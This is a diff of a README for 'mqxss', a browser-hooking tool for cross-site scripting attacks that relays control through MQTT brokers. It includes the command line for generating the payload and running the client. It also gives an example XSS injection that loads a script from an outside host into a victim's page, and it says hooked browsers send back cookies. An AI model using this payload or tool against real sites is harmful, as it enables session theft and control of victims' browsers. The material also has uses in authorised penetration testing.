@@ -10,16 +10,26 @@
 
 
 
-I created this without a lot of bells and whistles so that the user could send raw JS to the hooked browser.  The benefit to using this over beef or xsshunter is that there is no infra setup, you can use a public broker (however currently uses obfuscation, encryption is in the works).
+The benefit to using this over beef or xsshunter is that there is no infra setup, you can use a public broker (however currently uses obfuscation, encryption is in the works).
 
 Hooked browsers will communicate in the MQTT topic on the broker you specify, there are many public/free brokers to test this with.
+ 
 
-To generate a JS payload to hook browsers with set the -g flag at runtime along with your broker, port and topic variables.  Doing so will create your payload in the /js/ folder.
+The client utilizes the python paho.mqtt library while the js payload utilizes 'mqttws31.min.js' which it pulls from here 'https://cdnjs.cloudflare.com/ajax/libs/paho-mqtt/1.0.1/mqttws31.min.js'.
+ 
+***
+ 
+## Directions
+ 
+**To generate a JS payload** to hook browsers with set the -g flag at runtime along with your broker, port and topic variables.  Doing so will create your payload in the /js/ folder.  
 
-Then send your XSS payload to the victim while the mqxss client is running, ex: '"><script src=https://example.com/x.js></script> or something similar, if vulnerable you should get a notification saying the browser has connected with some basic details including cookies etc.
+**To run the client** provide your broker, port, and topic as so `mqxss.py -p 8081 -b some.mqtt.broker.com -t mytopicname`
+ 
+**Send your XSS payload** to the victim while the mqxss client is running, ex: '"><script src=https://example.com/x.js></script> or something similar, if vulnerable you should get a notification saying the browser has connected with some basic details including cookies etc.
  
 ![a](https://github.com/grampae/mqxss/assets/36344197/20096c91-2e9e-4302-b5a9-e2edd665d382)
 
+***
  
 **Features:**
 
